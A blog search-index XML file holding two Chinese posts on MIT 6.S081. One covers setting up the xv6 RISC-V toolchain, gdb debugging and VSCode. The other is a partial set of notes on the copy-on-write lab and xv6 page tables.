<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>6.S081的调试和VSCode环境配置</title>
    <url>/6.S081-VSCode-prepare-and-kernel-debugging/</url>
    <content><![CDATA[<p>6.S081的调试和VSCode环境配置，还有一些踩坑和小技巧，杂七杂八的都放在这一篇里面了。（遇到什么情况就更新，准备一直更到做完Lab）</p>
<span id="more"></span>

<h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><h3 id="Archlinux环境配置"><a href="#Archlinux环境配置" class="headerlink" title="Archlinux环境配置"></a>Archlinux环境配置</h3><p>我们可以用qemu模拟risc-v，就像模拟ARM一样。</p>
<p>直接参照这里来就好了。如果没有自带的包，可能会编译比较久。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi44MjgvMjAyMC90b29scy5odG1s">https://pdos.csail.mit.edu/6.828/2020/tools.html<i class="fa fa-external-link-alt"></i></span></p>
<p>Archlinux可以用pacman装这四个包，都在comunity源里。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S riscv64-linux-gnu-binutils riscv64-linux-gnu-gcc riscv64-linux-gnu-gdb qemu-arch-extra</span><br></pre></td></tr></table></figure>

<p>然后测试一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">riscv64-linux-gnu-gcc --version</span><br><span class="line">qemu-system-riscv64 --version</span><br></pre></td></tr></table></figure>

<p>测试一下编译运行xv6</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/mit-pdos/xv6-riscv.git</span><br><span class="line"><span class="built_in">cd</span> xv6-risvv</span><br><span class="line">make qemu</span><br></pre></td></tr></table></figure>

<p>结果发现不行，卡在这里不动了。搜了一下Archlinux就官网这一句话教程，也没别人遇到相同的问题（随手一搜arch的教程全是ubuntu的结果）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,if=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0</span><br></pre></td></tr></table></figure>

<p>依我用Archlinux的踩坑血泪史，八成是版本太高了。降级<strong>qemu-arch-extra</strong> 6.0.0一下试试，降级到跟官方页面上一致的版本5.1.0</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo downgrade qemu-arch-extra</span><br></pre></td></tr></table></figure>

<p>紧接着又报了这个错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,<span class="keyword">if</span>=none,format=raw,<span class="built_in">id</span>=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0</span><br><span class="line">qemu-system-riscv64: error <span class="keyword">while</span> loading shared libraries: liburing.so.1: cannot open shared object file: No such file or directory</span><br><span class="line">make: *** [Makefile:165: qemu] Error 127</span><br></pre></td></tr></table></figure>

<p>找不到io_uring的动态链接库，没关系，我们而再降级一下liburing或者自己下一个动态链接库趁系统不注意偷偷塞到<code>/usr/lib</code>之类的地方就好了。io_uring虽然很重要，但是查了依赖，我目前只有qemu直接依赖<code>liburing</code>(还有一个virtualbox的vde2是optionally requires)，那就直接降级吧。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo downgrade liburing</span><br></pre></td></tr></table></figure>

<p><img src="/6.S081-VSCode-prepare-and-kernel-debugging/1625406448.png"></p>
<p>然后一个sh就出现了，按Ctrl-a x退出。</p>
<p>到这里准备环境就好了，耗时10分钟。（用了降级系统包版本的脏办法，<code>io_uring</code>这么重要的东西自己乱换版本不太好，不过目前直接依赖系统<code>liburing</code>的包不多）</p>
<h3 id="更新Ubuntu20-04配置"><a href="#更新Ubuntu20-04配置" class="headerlink" title="更新Ubuntu20.04配置"></a>更新Ubuntu20.04配置</h3><p>受不了坑位上7年前采购的老电脑的编译速度了，换教研室的20核服务器远程编译了。为了方便先将Ubuntu Server强行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</span><br></pre></td></tr></table></figure>

<h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello, World"></a>Hello, World</h3><p>写一个helloworld看看是不是真的好了。</p>
<p>在user目录里面直接新建一个hello.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, nerd!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在Makefile里面修改，加上<code>$U/_hello\</code></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">  $U/_cat\</span><br><span class="line">  $U/_echo\</span><br><span class="line">  $U/_forktest\</span><br><span class="line">  $U/_grep\</span><br><span class="line">  $U/_hello\</span><br><span class="line">  $U/_init\</span><br><span class="line">  $U/_kill\</span><br></pre></td></tr></table></figure>

<p>然后编译运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make qemu</span><br></pre></td></tr></table></figure>

<p>（注意不要用return 0，用exit(0)终止进程，或者你喜欢单片机的裸机的写法不要返回直接void main也行）</p>
<p>（Make sure <code>main</code> calls <code>exit()</code> in order to exit your program. ）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hello</span><br><span class="line">Hello, nerd!</span><br></pre></td></tr></table></figure>

<p><img src="/6.S081-kernel-debugging/image-20210702150654556.png" alt="image-20210702150654556"></p>
<h2 id="gdb-qemu调试"><a href="#gdb-qemu调试" class="headerlink" title="gdb+qemu调试"></a>gdb+qemu调试</h2><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>现在6.S081推荐用<code>gdb-multiarch</code>这个包。<br>然后开两个终端（严格来讲应该叫终端模拟器，以下简称终端）, 第一个</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make qemu-gdb</span><br></pre></td></tr></table></figure>

<p>第二个终端运行的你gdb（arch用riscv64-linux-gnu-gdb、ubuntu用gdb-multiarch或者其他的版本）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">riscv64-linux-gnu-gdb</span><br></pre></td></tr></table></figure>

<p>然后能看到输出下面这样应该就没问题了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This GDB was configured as &quot;x86_64-pc-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">--Type &lt;RET&gt; for more, q to quit, c to continue without paging--</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line">The target architecture is set to &quot;riscv:rv64&quot;.</span><br><span class="line">warning: No executable has been specified and target does not support</span><br><span class="line">determining executable automatically.  Try using the &quot;file&quot; command.</span><br><span class="line">0x0000000000001000 in ?? ()</span><br></pre></td></tr></table></figure>

<p>Archlinux上<code>gdb-multiarch</code>还有一段报错，guile的问题不过貌似没啥太大影响，<code>riscv64-linux-gnu-gdb</code>是好的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception caught while booting Guile.</span><br><span class="line">Error in function &quot;make_objcode_from_file&quot;:</span><br><span class="line">bad header on object file: &quot;\x7fELF\x02\x01\x01ÿ\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">gdb-multiarch: warning: Could not complete Guile gdb module initialization from:</span><br><span class="line">/usr/share/gdb/guile/gdb/boot.scm.</span><br><span class="line">Limited Guile support is available.</span><br><span class="line">Suggest passing --data-directory=/path/to/gdb/data-directory.</span><br></pre></td></tr></table></figure>

<p>在第一个终端你会看到：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*** Now run <span class="string">&#x27;gdb&#x27;</span> <span class="keyword">in</span> another window.</span><br><span class="line">qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,<span class="keyword">if</span>=none,format=raw,<span class="built_in">id</span>=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 -S -gdb tcp::26000</span><br></pre></td></tr></table></figure>

<p>然后在另一个终端就可以调试了。gdb平时怎么用的现在就怎么用。这里以mkdir为例，给<code>main</code>函数打一个断点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) file user/_mkdir</span><br><span class="line">Reading symbols from user/_mkdir...</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x0: file user/mkdir.c, line 7.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 1 hit Breakpoint 1, main (argc=84215045, argv=0x505050505050505)</span><br><span class="line">    at user/mkdir.c:7</span><br><span class="line">7       &#123;</span><br></pre></td></tr></table></figure>

<p>输入c, 停在了initing,没有进入xv6的sh，可能是系统初始化的时候调用了mkdir，我们看一下变量</p>
<p><img src="/6.S081-VSCode-prepare-and-kernel-debugging/1626525086.png"></p>
<p>接着输入<code>c</code>往下走，在第一个终端（qemu）会进入xv6的sh，然后输入<code>mkdir hello</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[Switching to Thread 1.3]</span><br><span class="line"></span><br><span class="line">Thread 3 hit Breakpoint 1, main (argc=2, argv=0x2fc0) at user/mkdir.c:7</span><br><span class="line">7       &#123;</span><br><span class="line">(gdb) n</span><br><span class="line">10        <span class="keyword">if</span>(argc &lt; 2)&#123;</span><br><span class="line">(gdb) p argv[0]</span><br><span class="line"><span class="variable">$7</span> = 0x2ff0 <span class="string">&quot;mkdir&quot;</span></span><br><span class="line">(gdb) p argv[1]</span><br><span class="line"><span class="variable">$8</span> = 0x2fe0 <span class="string">&quot;hello&quot;</span></span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>

<p><img src="/6.S081-VSCode-prepare-and-kernel-debugging/1626525345.png"></p>
<p>可以看到执行过程中的变量了</p>
<h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>查看寄存器<code>info registers</code>，会列出32个通用寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) info registers</span><br><span class="line">ra             0x80001f60       0x80001f60 &lt;scheduler+92&gt;</span><br><span class="line">sp             0x8000a7c0       0x8000a7c0 &lt;stack0+3984&gt;</span><br><span class="line">gp             0x505050505050505        0x505050505050505</span><br><span class="line">tp             0x0      0x0</span><br><span class="line">t0             0x800027c6       2147493830</span><br><span class="line">t1             0x8000000000087fff       -9223372036854218753</span><br><span class="line">t2             0x505050505050505        361700864190383365</span><br><span class="line">fp             0x8000a810       0x8000a810 &lt;stack0+4064&gt;</span><br><span class="line">s1             0x80017768       2147579752</span><br><span class="line">a0             0x80011968       2147555688</span><br><span class="line">a1             0x80011970       2147555696</span><br><span class="line">a2             0x80025000       2147635200</span><br><span class="line">a3             0x80023086       2147627142</span><br><span class="line">a4             0x0      0</span><br><span class="line">a5             0x22     34</span><br><span class="line">--Type &lt;RET&gt; for more, q to quit, c to continue without paging--RET</span><br><span class="line">a6             0x505050505050505        361700864190383365</span><br><span class="line">a7             0x7      7</span><br><span class="line">s2             0x2      2</span><br><span class="line">s3             0x80017768       2147579752</span><br><span class="line">s4             0x80011950       2147555664</span><br><span class="line">s5             0x0      0</span><br><span class="line">s6             0x80011970       2147555696</span><br><span class="line">s7             0x1      1</span><br><span class="line">s8             0x3      3</span><br><span class="line">s9             0x0      0</span><br><span class="line">s10            0x0      0</span><br><span class="line">s11            0x0      0</span><br><span class="line">t3             0x505050505050505        361700864190383365</span><br><span class="line">t4             0x505050505050505        361700864190383365</span><br><span class="line">t5             0x505050505050505        361700864190383365</span><br><span class="line">t6             0x505050505050505        361700864190383365</span><br><span class="line">pc             0x80001faa       0x80001faa &lt;scheduler+166&gt;</span><br><span class="line">dscratch       Could not fetch register &quot;dscratch&quot;; remote failure reply &#x27;E14&#x27;</span><br><span class="line">mucounteren    Could not fetch register &quot;mucounteren&quot;; remote failure reply &#x27;E14&#x27;</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>

<p>RISC-V的寄存器有32个，比ARM多，已经超过了我的记忆容量。有需要就去翻<span class="exturl" data-url="aHR0cDovL2NydmEuaWN0LmFjLmNuL2RvY3VtZW50cy9SSVNDLVYtUmVhZGVyLUNoaW5lc2UtdjJwMS5wZGYuMTEuMw==">手册<i class="fa fa-external-link-alt"></i></span>吧<br>调试时大多数情况只要关注a开头的几个就好了, s开头的是系统保留。a0和a1是函数参数和返回值(Function arguments&#x2F;return values)，a2到a7是变量(Function arguments), 你可以用汇编操作这些寄存器的值。  </p>
<h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p><code>info threads</code>查看进程</p>
<h2 id="VSCode配置"><a href="#VSCode配置" class="headerlink" title="VSCode配置"></a>VSCode配置</h2><h3 id="代码提示和自动补全"><a href="#代码提示和自动补全" class="headerlink" title="代码提示和自动补全"></a>代码提示和自动补全</h3><p>自动补全插件推荐clangd（比Microsoft官方的那个c&#x2F;c++ extension好用）</p>
<p>默认的库函数提示会告诉你找不到<code>kernel/kernel.h</code>，需要手动添加</p>
<p><img src="/6.S081-VSCode-prepare-and-kernel-debugging/1626526305.png"></p>
<p>用clangd你需要一个<code>compile_commands.json</code>，我们可以安装bear，然后用bear生成<code>compile_commands.json</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S bear</span><br><span class="line">bear -- make qemu</span><br></pre></td></tr></table></figure>

<p>然后clangd插件就可以正常的跳转和识别头文件了</p>
<h3 id="使用clangd-format进行xv6代码风格的格式化"><a href="#使用clangd-format进行xv6代码风格的格式化" class="headerlink" title="使用clangd-format进行xv6代码风格的格式化"></a>使用clangd-format进行xv6代码风格的格式化</h3><p>有没有像Golang的go-fmt一样强制代码格式化的东西呢，有的，<span class="exturl" data-url="aHR0cHM6Ly9jbGFuZy5sbHZtLm9yZy9kb2NzL0NsYW5nRm9ybWF0Lmh0bWw=">clang format<i class="fa fa-external-link-alt"></i></span>。</p>
<p>安装<code>clangd</code>插件，在VSCode的设置里面启用<code>format on save</code>，然后在根目录下新建<code>.clang-format</code>文件。每次<code>ctrl+s</code>的时候就可以像go-fmt插件那样格式化代码了。</p>
<p>很遗憾的是，c&#x2F;c++的代码风格并没有一个官方的统一风格，各种风格争论不休。<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvcnZhbGRzL2xpbnV4L2Jsb2IvbWFzdGVyLy5jbGFuZy1mb3JtYXQ=">Linux的format风格<i class="fa fa-external-link-alt"></i></span>我不太习惯，比如一个tab占8个空格。<br>下面是我改了改llvm风格的配置，跟6.828Lab的xv6风格不太一样，函数类型和函数一行，tab是4个空格（tab空两个看起来真的难受，早期显示屏小才这样子干，我觉得24寸以上显示器空四个才是合理的），括号换行和golang一样。（不然在go和c之间来回切换我要精神分裂了）</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FyY2hhZW9yYXB0b3IvZG90ZmlsZXMvYmxvYi9tYXN0ZXIvdnNjb2RlLy5jbGFuZy1mb3JtYXQ=">https://github.com/Archaeoraptor/dotfiles/blob/master/vscode/.clang-format<i class="fa fa-external-link-alt"></i></span></p>
<p>需要注意的是，一定不要对#include头文件自动排序，要设置<code>SortIncludes:    false</code>不然头文件顺序不对会报错。</p>
<p>比如排序前：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>自动格式化后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>就会报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./kernel/stat.h:7:3: error: unknown type name ‘uint’</span><br><span class="line">    7 |   uint ino;    // Inode number</span><br><span class="line">      |   ^~~~</span><br><span class="line">./kernel/stat.h:10:3: error: unknown type name ‘uint64’</span><br><span class="line">   10 |   uint64 size; // Size of file in bytes</span><br><span class="line">      |   ^~~~~~</span><br><span class="line">make: *** [&lt;builtin&gt;: user/pingpong.o] Error 1</span><br></pre></td></tr></table></figure>

<p>ps：如果你想要xv6Lab的风格，可以用Mozilla的风格改一改。</p>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="gdb调试报错Cannot-access-memory-at-address"><a href="#gdb调试报错Cannot-access-memory-at-address" class="headerlink" title="gdb调试报错Cannot access memory at address"></a>gdb调试报错Cannot access memory at address</h3><p>我在Archlinux下用<code>riscv64-linux-gnu-gdb</code>调试会报<code>Cannot access memory at address 0x278</code></p>
<p>本来以为是跟以前在ARM上内核地址随机化一样的问题，关了随机化还是不行，最后发现要在<code>.gdbinit.tmpl-riscv</code>加一条<code>set riscv use-compressed-breakpoints yes</code></p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS2F0eXVNYXJpc2FCbG9nL3AvMTM3Mjc1NjUuaHRtbA==">MIT 6.S081 xv6调试不完全指北<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi44MjgvMjAyMC9sZWMvZ2RiX3NsaWRlcy5wZGY=">Using the GNU Debugger<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dhYnNjYWxlL3h2Ni1wdWJsaWM=">https://github.com/wabscale/xv6-public<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JpenNvdHRvL0JlYXI=">https://github.com/rizsotto/Bear<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>debug</tag>
        <tag>6.S081</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>6.S081 Lab Copy on Write笔记</title>
    <url>/6-S081-lab-cow/</url>
    <content><![CDATA[<p>COW实现起来好多小坑啊（更新了一点页表相关的笔记，当时做页表那个Lab的时候xv6页表相关的源码研究的不仔细, 把页表和进程那一堆东西好好看一遍这个Lab就好做了）</p>
<span id="more"></span>

<h2 id="Copy-on-Write"><a href="#Copy-on-Write" class="headerlink" title="Copy on Write"></a>Copy on Write</h2><p>大概思路就是，父子进程fork出来的时候共享物理内存（这个时候是只读的）。当子进程修改的时候copy出来一份（通过page fault触发的）。</p>
<p>设置内存是只读还是可写就在PTE里面修改相关的标志位：</p>
<p>PTE_V: is the PTE present? （是否valid，如果不是尝试访问将会缺页异常）<br>PTE_R: allowed to read (to the page)? （COW刚fork出来的时候是只读的）<br>PTE_W: allowed to write? （COW时child有修改，复制后状态变为可写）<br>PTE_X: interpret the content of the page as instructions and execute （内容（4k大小的页里面村的东西）能否被当成指令执行）<br>PTE_U: allowed user mode instructions to access the page （这个是用来区分用户页表和内核页表的，下面Lab用到的是用户进程页表）</p>
<p><img src="/6-S081-lab-cow/1652757417.png"></p>
<p>然后先说一下RISC-V中的page fault，当CPU无法完成虚拟地址（virtual address）到物理地址（physical address）的转换，就会page fault。一般有三种：  </p>
<p>load page fault：load指令不能地址转换<br>store page fault：store指令不能完成地址转换<br>instruction page fault：when the address for an instruction<br>doesn’t translate</p>
<p>前面两个比较熟悉，那个<code>instruction page fault</code>是什么呢， 翻了一下RISC-V的手册的SCAUSE，好像就是其他指令触发的page fault</p>
<p><img src="/6-S081-lab-cow/1652757093.png"></p>
<p>我们要获取page fault的原因就去读SCAUSE寄存器的值，xv6中直接用xv6封装好的<code>r_scause()</code>函数</p>
<p>要判断是哪个virtual address造成的page fault就去看STVAL寄存器， xv6中可以用封装好的<code>r_stval()</code>函数（STVAl寄存器保存的是page fault时出错的地址， Supervisor bad address or instruction.）</p>
<p>然后就是引用计数的问题，在xv6面一个physical page一般只对应一个进程（或者COW的父子进程），进程销毁物理页就直接删了就好了。所以不需要引用计数也能跑过这个Lab的test。但是在linux等其他系统中，会存在多个进程共享一个物理页的情况，一般是用引用计数来解决这个问题。</p>
<h2 id="xv6进程的虚拟内存和页表操作"><a href="#xv6进程的虚拟内存和页表操作" class="headerlink" title="xv6进程的虚拟内存和页表操作"></a>xv6进程的虚拟内存和页表操作</h2><p>相关函数在<code>kernel/vm.c</code>，一些定义在<code>riscv.h</code>。</p>
<p>页大小是4k，然后pageshift（offset）是12（32位系统）。下面引用一下linux里面PAGE_SHIFT的作用：</p>
<blockquote>
<p>PAGE_SHIFT的作用是通过对地址右移PAGE_SHIFT得到一个地址所在页的页号<br>内核地址，无论是虚拟的还物理的，其都由两部分组成。往往是高N位是页号，低M位是页内的偏移量。<br>当我们将地址中的低M位偏移量抛弃不用，高N位的页号，移到右端，得到这个结果称页帧号。<br>移动位以在页帧数和地址之间转换是一个常用操作。宏PAGE_SHIFT， 告诉我们要右移多少位得到页帧号。</p>
</blockquote>
<p>这个先简单的当成offset就可以了</p>
<p><img src="/6-S081-lab-cow/1652791105.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PGSIZE 4096 <span class="comment">// bytes per page</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSHIFT 12  <span class="comment">// bits of offset within a page</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以PGSIZE为单位向上取整， 比如514会被取整为4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGROUNDUP(sz) (((sz) + PGSIZE - 1) &amp; ~(PGSIZE - 1))</span></span><br><span class="line"><span class="comment">// 以PGSIZE为单位向下取整， 比如114会被取整为0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGROUNDDOWN(a) (((a)) &amp; ~(PGSIZE - 1))</span></span><br></pre></td></tr></table></figure>

<p>pagetable_t类型是一个uint64</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> uint64 *<span class="type">pagetable_t</span>; <span class="comment">// 512 PTEs</span></span><br></pre></td></tr></table></figure>

<p>PTE(page table, entry, 页表项)也是一个uint64</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> uint64 <span class="type">pte_t</span>;</span><br></pre></td></tr></table></figure>

<p>然后我们看mappages，用来创建Virtual Address的PTE, 将长度为size，从pa开始的物理内存映射到虚拟内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Create PTEs for virtual addresses starting at va that refer to</span></span><br><span class="line"><span class="comment">// physical addresses starting at pa. va and size might not</span></span><br><span class="line"><span class="comment">// be page-aligned. Returns 0 on success, -1 if walk() couldn&#x27;t</span></span><br><span class="line"><span class="comment">// allocate a needed page-table page.</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mappages</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va, uint64 size, uint64 pa,</span></span><br><span class="line"><span class="params">             <span class="type">int</span> perm)</span> &#123;</span><br><span class="line">    uint64 a, last;</span><br><span class="line">    <span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;mappages: size&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a = PGROUNDDOWN(va);</span><br><span class="line">    last = PGROUNDDOWN(va + size - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pte = walk(pagetable, a, <span class="number">1</span>)) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (*pte &amp; PTE_V)</span><br><span class="line">            panic(<span class="string">&quot;mappages: remap&quot;</span>);</span><br><span class="line">        *pte = PA2PTE(pa) | perm | PTE_V;</span><br><span class="line">        <span class="keyword">if</span> (a == last)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        a += PGSIZE;</span><br><span class="line">        pa += PGSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进程在fork的时候调用了uvmcopy，用来从parent拷贝一份一样的内存到child</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// Copy user memory from parent to child.</span></span><br><span class="line">    <span class="keyword">if</span> (uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        freeproc(np);</span><br><span class="line">        release(&amp;np-&gt;lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的实现是直接copy的，类似memcpy那样直接拷贝了一段内存（实际上xv6里面的memcpy就是memmove实现的）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Given a parent process&#x27;s page table, copy</span></span><br><span class="line"><span class="comment">// its memory into a child&#x27;s page table.</span></span><br><span class="line"><span class="comment">// Copies both the page table and the</span></span><br><span class="line"><span class="comment">// physical memory.</span></span><br><span class="line"><span class="comment">// returns 0 on success, -1 on failure.</span></span><br><span class="line"><span class="comment">// frees any allocated pages on failure.</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span> &#123;</span><br><span class="line">    <span class="type">pte_t</span> *pte;</span><br><span class="line">    uint64 pa, i;</span><br><span class="line">    uint flags;</span><br><span class="line">    <span class="type">char</span> *mem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i += PGSIZE) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">            panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">            panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">        pa = PTE2PA(*pte);</span><br><span class="line">        flags = PTE_FLAGS(*pte);</span><br><span class="line">        <span class="keyword">if</span> ((mem = kalloc()) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> err;</span><br><span class="line">        memmove(mem, (<span class="type">char</span> *)pa, PGSIZE);</span><br><span class="line">        <span class="keyword">if</span> (mappages(new, i, PGSIZE, (uint64)mem, flags) != <span class="number">0</span>) &#123;</span><br><span class="line">            kfree(mem);</span><br><span class="line">            <span class="keyword">goto</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">    uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>uvmcreate也是类似的，分别调用了<code>kalloc</code>， 然后设置一下PTE标志位</p>
